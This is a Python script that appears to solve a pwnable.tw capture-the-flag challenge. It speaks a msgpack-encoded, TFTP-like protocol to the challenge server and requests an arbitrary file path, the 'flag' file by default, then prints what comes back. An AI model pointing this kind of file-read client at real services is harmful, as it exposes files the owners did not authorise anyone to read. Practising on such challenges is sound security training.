#!/usr/bin/env python3

import re
import socket
import sys

import msgpack


HOST = "chall.pwnable.tw"
TCP_PORT = 10309


def get_udp_port():
    io = socket.create_connection((HOST, TCP_PORT), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp(io):
    local_port = io.getsockname()[1]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", local_port))
    s.settimeout(5)
    return s


def rrq_read(path):
    io, udp_port = get_udp_port()
    udp = make_udp(io)

    rrq = [1, path, "octet"]
    udp.sendto(msgpack.packb(rrq, use_bin_type=True), (HOST, udp_port))

    out = bytearray()
    expected = 1
    while True:
        data, _ = udp.recvfrom(65535)
        pkt = msgpack.unpackb(data, raw=False, strict_map_key=False)
        op = pkt[0]
        if op == 6:
            ack = [4, 0]
            udp.sendto(msgpack.packb(ack, use_bin_type=True), (HOST, udp_port))
            continue
        if op == 5:
            raise RuntimeError(f"server error: {pkt!r}")
        if op != 3:
            raise RuntimeError(f"unexpected packet: {pkt!r}")

        block, crc, chunk = pkt[1], pkt[2], pkt[3]
        if block != expected:
            raise RuntimeError(f"unexpected block {block}, expected {expected}")
        if isinstance(chunk, str):
            chunk = chunk.encode()
        out.extend(chunk)

        ack = [4, block]
        udp.sendto(msgpack.packb(ack, use_bin_type=True), (HOST, udp_port))
        if len(chunk) < 512:
            break
        expected += 1

    io.close()
    udp.close()
    return bytes(out)


def main():
    args = sys.argv[1:]
    if args and args[0] == "REMOTE":
      args = args[1:]
    path = args[0] if args else "flag"
    data = rrq_read(path)
    sys.stdout.buffer.write(data)


if __name__ == "__main__":
    main()
